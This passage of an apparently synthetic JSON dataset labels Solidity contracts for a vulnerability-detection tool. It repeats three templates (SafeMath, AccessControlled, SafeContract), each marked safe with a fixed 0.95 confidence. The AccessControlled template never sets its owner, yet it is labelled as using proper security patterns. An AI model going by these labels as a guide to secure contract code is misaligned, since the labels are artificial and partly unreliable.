    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 362",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 363",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 364",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 365",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 366",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 367",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 368",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 369",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 370",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 371",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 372",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 373",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 374",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 375",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 376",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 377",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 378",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 379",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 380",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 381",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 382",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 383",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 384",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 385",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 386",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 387",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 388",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 389",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 390",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 391",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
